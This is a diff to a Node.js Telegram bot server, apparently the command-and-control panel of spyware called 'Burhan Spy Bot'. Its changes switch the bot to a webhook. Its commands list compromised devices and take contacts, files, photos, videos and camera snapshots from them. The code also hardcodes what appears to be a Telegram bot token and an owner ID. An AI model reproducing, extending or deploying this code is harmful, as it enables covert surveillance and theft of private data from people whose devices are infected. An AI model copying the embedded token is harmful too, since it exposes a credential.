@@ -6,7 +6,7 @@ const axios = require('axios');
 
 const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
 const YOUR_USER_ID = 2062068620;
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(token); // ⚠️ POLLING HATA DIYA
 const app = express();
 app.use(express.json());
 
@@ -85,7 +85,16 @@ app.get('/api/commands', (req, res) => {
     res.json({ command: 'status' });
 });
 
-// ✅ Bot ko commands sunna hai
+// ✅ TELEGRAM WEBHOOK SETUP (MOST IMPORTANT)
+bot.setWebHook(`${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook`);
+
+// ✅ WEBHOOK RECEIVER (Telegram messages yahan aayenge)
+app.post('/webhook', (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+// ✅ START COMMAND
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -95,6 +104,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/getvideo - Get Video\n/camera - Camera Snapshot\n/ping - Check device alive\n/stats - Total devices\n/contacts - Fetch contacts\n/help - Commands ka format`);
 });
 
+// ✅ /devices
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -145,7 +155,7 @@ bot.onText(/\/devices/, (msg) => {
     bot.sendMessage(chatId, message);
 });
 
-// ✅ /contacts <ID> — Contacts fetch karo
+// ✅ /contacts <ID>
 bot.onText(/\/contacts (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -167,7 +177,7 @@ bot.onText(/\/contacts (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /files <ID> — Files scan karo
+// ✅ /files <ID>
 bot.onText(/\/files (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -189,7 +199,7 @@ bot.onText(/\/files (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /getphoto <ID> <path> — Photo download karo
+// ✅ /getphoto <ID> <path>
 bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -212,7 +222,7 @@ bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /getvideo <ID> <path> — Video download karo
+// ✅ /getvideo <ID> <path>
 bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -235,7 +245,7 @@ bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /camera <ID> <front|back> — Snapshot
+// ✅ /camera <ID> <front|back>
 bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -258,7 +268,7 @@ bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /ping <ID> — Device alive check
+// ✅ /ping <ID>
 bot.onText(/\/ping (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -280,7 +290,7 @@ bot.onText(/\/ping (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /stats — Total devices
+// ✅ /stats
 bot.onText(/\/stats/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
